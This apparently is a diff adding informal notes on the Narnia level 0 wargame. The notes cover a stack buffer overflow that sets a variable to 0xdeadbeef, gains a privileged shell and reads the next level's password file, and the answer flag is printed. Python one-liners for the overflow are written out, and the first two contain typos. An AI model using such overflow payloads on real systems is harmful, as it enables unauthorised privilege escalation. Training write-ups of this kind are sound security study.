@@ -1,0 +1,36 @@
+username to start:
+narnia0
+narnia0
+
+so we have a execuatable narnia0 along with the sourcecode narnia.c
+okay that's good no need to do any reverse engineering.
+
+execuate the program, the prompt asked for input.
+okay so essentially, we need to change the input to deadbeef.
+
+looking at the sourcecode, the variable buf has 20 bytes of memory,
+but scanf() reads in 24. So can can overflow with 4 bytes.
+Hmm, fitting deadbeef in 4 bytes.
+
+oh and the memory is stored as little endian!
+
+!!!Python3 script did not work, no idea why:
+python3 -c 'print("B*20"+"\xef\xbe\xad\xbe")' | ./narnia0
+
+changed to python2 and it worked:
+python -c 'print "B"*20 + \xef\xbe\xad\be' | ./narnia0
+
+we got deadbeef but it won't spawn a new shell??
+
+okay so the problem is it's still reading the input from python,
+so a workaround is:
+
+(python -c 'print "B"*20 + "\xef\xbe\xad\xde"'; cat ) | ./narnia0
+we then have a new shell with narnia1 privilege, now we can cat the password for the next
+level.
+
+cat /etc/narnia_pass/narnia1
+
+flag retrieved: efeidiedae
+
+Thought it was easy, not quite.
